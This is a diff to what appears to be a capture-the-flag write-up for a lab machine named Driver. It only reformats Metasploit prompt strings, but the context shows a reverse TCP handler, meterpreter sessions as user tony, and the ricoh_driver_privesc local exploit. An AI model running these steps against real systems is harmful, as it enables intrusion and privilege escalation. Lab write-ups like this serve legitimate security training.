@@ -328,7 +328,7 @@ Exploit target:
 It worked!!!!
 
 ```bash
-[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[[Jobs:0 Agents:0|msf]] exploit(multi/handler) >> run
 
 [*] Started reverse TCP handler on 10.10.14.12:9001 
 [*] Sending stage (200774 bytes) to 10.10.11.106
@@ -362,7 +362,7 @@ Exploit target:
    --  ----
    0   Windows
 
-[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> run
+[[Jobs:0 Agents:1|msf]] exploit(windows/local/ricoh_driver_privesc) >> run
 
 [*] Started reverse TCP handler on 10.10.14.12:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -504,7 +504,7 @@ Exploit target:
    0   Windows
 
 
-[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> sessions -l
+[[Jobs:0 Agents:2|msf]] exploit(windows/local/ricoh_driver_privesc) >> sessions -l
 
 Active sessions
 ===============
@@ -514,9 +514,9 @@ Active sessions
   3         meterpreter x86/windows  DRIVER\tony @ DRIVER  10.10.14.12:9001 -> 10.10.11.106:49450 (10.10.11.106)
   5         meterpreter x86/windows  DRIVER\tony @ DRIVER  10.10.14.12:9001 -> 10.10.11.106:49452 (10.10.11.106)
 
-[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> set SESSION 5
+[[Jobs:0 Agents:2|msf]] exploit(windows/local/ricoh_driver_privesc) >> set SESSION 5
 SESSION => 5
-[msf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) >> run
+[[Jobs:0 Agents:2|msf]] exploit(windows/local/ricoh_driver_privesc) >> run
 
 [*] Started reverse TCP handler on 10.10.14.12:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
